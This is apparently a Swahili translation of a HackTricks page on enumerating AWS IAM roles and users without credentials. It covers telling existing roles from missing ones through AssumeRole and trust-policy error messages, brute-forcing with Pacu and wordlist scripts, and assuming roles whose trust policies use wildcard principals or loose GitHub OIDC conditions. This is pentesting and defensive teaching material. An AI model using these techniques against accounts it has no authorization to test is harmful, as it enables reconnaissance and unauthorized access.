# AWS - IAM & STS Unauthenticated Enum

<details>

<summary><strong>Jifunze kuhusu udukuzi wa AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

## Enumerate Majukumu & Majina ya Watumiaji kwenye akaunti

### ~~Kudai Jukumu kwa Nguvu~~

{% hint style="danger" %}
**Mbinu hii haifanyi kazi** tena kwa sababu ikiwa jukumu lipo au la, daima utapata kosa hili:

`Kumetokea kosa (AccessDenied) wakati wa kuita shughuli ya AssumeRole: Mtumiaji: arn:aws:iam::947247140022:user/testenv hana idhini ya kutekeleza: sts:AssumeRole kwenye rasilimali: arn:aws:iam::429217632764:role/account-balanceasdas`

Unaweza **jaribu hili kwa kukimbia**:

`aws sts assume-role --role-arn arn:aws:iam::412345678909:role/superadmin --role-session-name s3-access-example`
{% endhint %}

Kujaribu **kudai jukumu bila idhini inayohitajika** husababisha ujumbe wa kosa kutoka AWS. Kwa mfano, ikiwa huna idhini, AWS inaweza kurudisha:
```ruby
An error occurred (AccessDenied) when calling the AssumeRole operation: User: arn:aws:iam::012345678901:user/MyUser is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::111111111111:role/aws-service-role/rds.amazonaws.com/AWSServiceRoleForRDS
```
Ujumbe huu unathibitisha uwepo wa jukumu lakini unaonyesha kwamba sera yake ya kuchukua jukumu hairuhusu dhana yako. Kwa upande mwingine, jaribio la **kuchukua jukumu lisililopo husababisha hitilafu tofauti**:
```less
An error occurred (AccessDenied) when calling the AssumeRole operation: Not authorized to perform sts:AssumeRole
```
Kwa kuvutia, njia hii ya **kutofautisha kati ya majukumu yanayopo na yasiyopo** inatumika hata kati ya akaunti tofauti za AWS. Kwa kitambulisho halali cha akaunti ya AWS na orodha ya maneno iliyolengwa, mtu anaweza kuchunguza majukumu yaliyopo katika akaunti bila kukutana na vizuizi vyovyote vya asili.

Unaweza kutumia [script huu kutambua wakuu wanaowezekana](https://github.com/RhinoSecurityLabs/Security-Research/tree/master/tools/aws-pentest-tools/assume\_role\_enum) kwa kutumia suala hili.

### Sera za Kuamini: Kuvunja nguvu majukumu na watumiaji wa akaunti za msalaba

Kuweka au kusasisha **sera ya kuamini ya jukumu la IAM kunahusisha kufafanua ni rasilimali au huduma za AWS zipi zinaruhusiwa kuchukua jukumu hilo** na kupata vibali vya muda. Ikiwa rasilimali iliyotajwa katika sera **ipo**, sera ya kuamini inahifadhiwa **kwa mafanikio**. Walakini, ikiwa rasilimali **haipo**, **kosa linazalishwa**, ikionyesha kuwa wakuu batili walitolewa.

{% hint style="warning" %}
Tafadhali elewa kuwa katika rasilimali hiyo unaweza kufafanua jukumu au mtumiaji wa akaunti ya msalaba:

* `arn:aws:iam::acc_id:role/role_name`
* `arn:aws:iam::acc_id:user/user_name`
{% endhint %}

Hii ni mfano wa sera:
```json
{
"Version":"2012-10-17",
"Statement":[
{
"Effect":"Allow",
"Principal":
{
"AWS":"arn:aws:iam::216825089941:role\/Test"
},
"Action":"sts:AssumeRole"
}
]
}
```
#### GUI

Hii ni **kosa** utakalolipata ukatumia **jukumu ambalo halipo**. Ikiwa jukumu **lipo**, sera itahifadhiwa bila makosa yoyote. (Kosa ni kwa ajili ya kuboresha, lakini pia inafanya kazi wakati wa kuunda)

![](<../../../.gitbook/assets/image (68).png>)

#### CLI
```bash
### You could also use: aws iam update-assume-role-policy
# When it works
aws iam create-role --role-name Test-Role --assume-role-policy-document file://a.json
{
"Role": {
"Path": "/",
"RoleName": "Test-Role",
"RoleId": "AROA5ZDCUJS3DVEIYOB73",
"Arn": "arn:aws:iam::947247140022:role/Test-Role",
"CreateDate": "2022-05-03T20:50:04Z",
"AssumeRolePolicyDocument": {
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::316584767888:role/account-balance"
},
"Action": [
"sts:AssumeRole"
]
}
]
}
}
}

# When it doesn't work
aws iam create-role --role-name Test-Role2 --assume-role-policy-document file://a.json
An error occurred (MalformedPolicyDocument) when calling the CreateRole operation: Invalid principal in policy: "AWS":"arn:aws:iam::316584767888:role/account-balanceefd23f2"
```
Unaweza kiotomatisha mchakato huu kwa kutumia [https://github.com/carlospolop/aws\_tools](https://github.com/carlospolop/aws\_tools)

* `bash unauth_iam.sh -t user -i 316584767888 -r TestRole -w ./unauth_wordlist.txt`

Tumia [Pacu](https://github.com/RhinoSecurityLabs/pacu):

* `run iam__enum_users --role-name admin --account-id 229736458923 --word-list /tmp/names.txt`
* `run iam__enum_roles --role-name admin --account-id 229736458923 --word-list /tmp/names.txt`
* Jukumu la `admin` lililotumiwa kwenye mfano ni **jukumu katika akaunti yako litakalotumiwa na pacu kujifanya kuwa** ili kuunda sera inayohitajika kwa uchambuzi

### Privesc

Katika kesi jukumu lilikuwa limeconfigure vibaya na kuruhusu yeyote kuchukua:
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Principal": {
"AWS": "*"
},
"Action": "sts:AssumeRole"
}
]
}
```
Mshambuliaji anaweza tu kudai hilo.

## Ushirikiano wa Tatu wa OIDC

Fikiria kwamba unaweza kusoma **mkondo wa hatua za Github** ambao unapata **jukumu** ndani ya **AWS**.\
Imani hii inaweza kumpa ufikiaji wa jukumu lenye **sera ya imani** ifuatayo:
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Principal": {
"Federated": "arn:aws:iam::<acc_id>:oidc-provider/token.actions.githubusercontent.com"
},
"Action": "sts:AssumeRoleWithWebIdentity",
"Condition": {
"StringEquals": {
"token.actions.githubusercontent.com:aud": "sts.amazonaws.com"
}
}
}
]
}
```
Sera hii ya uaminifu inaweza kuwa sahihi, lakini **ukosefu wa hali zaidi** unapaswa kukufanya usiwaamini.\
Hii ni kwa sababu jukumu la awali linaweza kuchukuliwa na **MTU yeyote kutoka Github Actions**! Unapaswa kueleza katika hali pia mambo mengine kama jina la org, jina la repo, env, tawi...

Hitilafu nyingine inayowezekana ni kuongeza **hali kama ifuatavyo:**
```json
"StringLike": {
"token.actions.githubusercontent.com:sub": "repo:org_name*:*"
}
```
Tafadhali kumbuka **alama ya mwanya** (\*) kabla ya **mabano** (:). Unaweza kuunda shirika kama **jina_la_org1** na **kudai jukumu** kutoka kwa Hatua ya Github.

## Marejeo

* [https://www.youtube.com/watch?v=8ZXRw4Ry3mQ](https://www.youtube.com/watch?v=8ZXRw4Ry3mQ)
* [https://rhinosecuritylabs.com/aws/assume-worst-aws-assume-role-enumeration/](https://rhinosecuritylabs.com/aws/assume-worst-aws-assume-role-enumeration/)

<details>

<summary><strong>Jifunze kuhusu udukuzi wa AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>
